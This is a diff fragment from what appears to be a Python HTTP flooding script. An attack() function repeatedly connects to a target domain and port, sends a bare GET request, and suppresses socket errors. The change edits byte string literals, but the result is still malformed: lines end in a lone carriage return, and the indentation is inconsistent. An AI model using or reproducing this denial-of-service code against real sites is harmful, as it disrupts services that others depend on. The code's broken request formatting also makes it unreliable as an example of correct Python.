@@ -16,12 +16,9 @@ def attack():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target_domain, target_port))
-s.send(b"GET / HTTP/1.1\r
-"
-      b"Host: "+bytes(target_domain, 'utf-8')+b"\r
-"
-      b"\r
-")
+s.send(b"GET / HTTP/1.1\r"
+      b"Host: "+bytes(target_domain, 'utf-8')+b"\r"
+      b"\r")
             s.close()
         except socket.error:
             pass
